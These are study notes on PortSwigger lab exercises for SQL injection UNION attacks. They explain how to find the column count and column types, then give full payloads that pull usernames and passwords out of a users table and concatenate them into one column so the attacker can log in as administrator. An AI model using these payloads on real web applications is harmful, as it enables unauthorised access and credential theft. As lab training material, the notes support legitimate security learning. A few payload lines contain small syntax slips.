# SQL injection UNION attacks

For a UNION query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

```
SELECT product_name, price FROM products 
UNION SELECT username, age
```

The query above met the requirements:

| string | integer |
| -------| ------- |
| product_name | price | 
| username | age |


This one didn't meet the requirements:

```
SELECT product_name, price FROM products 
UNION SELECT id, username, password
```
## Determining the number of columns required in an SQL injection UNION attack
Method 1:
```
' ORDER BY 1, --
' ORDER BY 1,2 --
... 
' ORDER BY 1,2,3,N -- 
```

Method 2:  

```
' UNION SELECT NULL -- 
' UNION SELECT NULL, NULL -- 
...
' UNION SELECT NULL, NULL, NULL, NULL, NULL -- 
```

Indicator to detect: error message.
## Determining the columns data type in an SQL injection UNION attack

Example of finding a string data type

```
' UNION SELECT 'a', NULL --
```
If it returns an error, that means the data isn't compatible with the column in the original query.

Try second column
```
' UNION SELECT NULL, 'a' --
```
If it is still returns an error, try the third, fourth and so on.

# Labs
## Lab #3: SQL injection UNION attack, determining the number of columns returned by the query
> To solve the lab, determine the number of columns returned by the query by performing an SQL injection UNION attack that returns an additional row containing null values. 

Steps: 

1. Determine the number of columns by index.
```
category=Lifestyle' ORDER BY 1,2 --
category=Lifestyle' ORDER BY 1,2, --
category=Lifestyle' ORDER BY 1,2,3 --
category=Lifestyle' ORDER BY 1,2,3,4 -- # error
```
2. Fill with null.
```
category=Lifestyle' UNION SELECT NULL,NULL,NULL --
```

## Lab #4: SQL injection UNION attack, finding a column containing text
> The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 

Steps:

1. Determine the number of columns 
```
category=Pets' ORDER BY 1,2,3 --
```

2. Determine column data type 
```
category=Pets' UNION SELECT 'inject',null,null --
category=Pets' UNION SELECT null,'inject',null --
category=Pets' UNION SELECT null,'inject','inject' --
```

## Lab #5: SQL injection UNION attack, retrieving data from other tables 
> The database contains a different table called users, with columns called username and password. 
> 
> To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 

Suppose that:
- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the WHERE clause.
- The database contains a table called `users` with the columns `username` and `password`.

Steps:
1. Determine the number of column 
```
category=Lifestyles' ORDER BY 1,2 --
```

2. Determine the data type in each column 
```
category=Lifestyles' UNION SELECT 'a', NULL --
category=Lifestyles' UNION SELECT 'a', 'NULL' --
```

3. Retrieve data from the table users.
```
category=Lifestyles' UNION select username, password FROM users --
```
4. Login

## Lab #6: SQL injection UNION attack, retrieving multiple values in a single column
>  The database contains a different table called users, with columns called username and password.
> To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the administrator user. 
> Note: Different databases use different syntax
> Cheatsheet to examine the database version and which syntax to use
> https://portswigger.net/web-security/sql-injection/cheat-sheet


Lab steps:
1. Determine the number of column 
```
category=Gifts' ORDER BY 1, 2 --
```

2. Determine the data type in each column 
```
category=Gifts' UNION SELECT NULL, 'a' --
```

3. Examining the database version.
```
category=Gifts' UNION SELECT NULL, version() --
```

4. Retrieve multiple values from single column
```
category=Gifts' UNION SELECT NULL, username || ':' || password FROM users --
```

5. Login